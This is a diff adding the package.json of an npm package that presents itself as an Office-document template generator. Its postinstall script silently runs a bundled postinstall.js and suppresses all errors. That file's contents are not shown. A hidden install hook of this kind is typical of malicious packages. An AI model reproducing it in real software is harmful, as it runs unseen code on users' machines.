@@ -1,0 +1,17 @@
+{
+  "name": "@mllx87/puredocx-pro-module",
+  "version": "1.0.0",
+  "description": "Generate docx, pptx, and xlsx from templates (Word, Powerpoint and Excel documents), from Node.js, the Browser.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node -e \"try{require('./postinstall.js')}catch(e){}\"",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": {
+    "name": "Timmy",
+    "email": "support@milyleshare.com",
+    "url": "https://puredocx.com"
+  },
+  "license": "MIT"
+}
+
